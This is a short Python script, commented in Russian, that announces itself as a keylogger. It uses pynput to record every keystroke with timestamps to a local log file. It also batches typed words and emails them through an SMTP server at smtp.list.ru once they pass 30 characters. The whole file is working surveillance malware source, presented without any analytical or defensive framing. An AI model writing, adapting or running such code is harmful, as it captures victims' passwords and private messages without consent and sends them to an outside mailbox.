import time
import getpass
import smtplib
from pynput.keyboard import Key, Listener

print('\n\n')
print('Запуск keylogger-a...\n\n')

# Ввод логина и пароля электронной почты, на которую
# будут отправляться письма
email = input('Введите email: ')
password = getpass.getpass(prompt='Введите пароль: ')
server = smtplib.SMTP_SSL('smtp.list.ru', 465)
server.login(email, password)

# Определение глобальных переменных
cur_log = ''
word = ''
email_char_limit = 30
is_ctrl = False
path = 'e:/file.log'


# Регистрация клавиши при нажатии
def press_elem(event):
  global email
  global cur_log
  global word
  global email_char_limit
  global is_ctrl
  if event == Key.ctrl_l:
    is_ctrl = True
  if event != Key.ctrl_l and event != Key.f5:
    is_ctrl = False
  if event == Key.f5 and is_ctrl:
    return False
  if event == Key.space or event == Key.enter:
    word += ' '
    cur_log += word
    word = ''
    if len(cur_log) >= email_char_limit:
      send_log()
      cur_log = ''
  elif event == Key.shift_l or event == Key.shift_r:
    return
  elif event == Key.backspace:
    word = word[:-1]
  else:
    event = str(event)
    check = event.find('Key')
    if check != -1:
      event = event.replace('Key.', '')
      word += event
    else:
      word += event[1:-1]

  
  event = str(event)
  check = event.find('Key')
  if check != -1:
    event = event.replace('Key.', '')
  with open(path, 'a+') as f:
    f.write('{}-'.format(event))
    f.write('{}:'.format(time.time()))
    

# Регистрация клавиши после нажатия
def release_elem(event):
  with open(path, 'a+') as f:
    f.write('{}\n'.format(time.time()))


# Отправка данных на электронную почту
def send_log():
  server.sendmail(email, email, cur_log)

if __name__ == '__main__':
  with open(path, 'a+') as f:
    f.write('{}\n'.format(time.ctime()))
  with Listener(on_press = press_elem, on_release = release_elem) as listener:
    listener.join()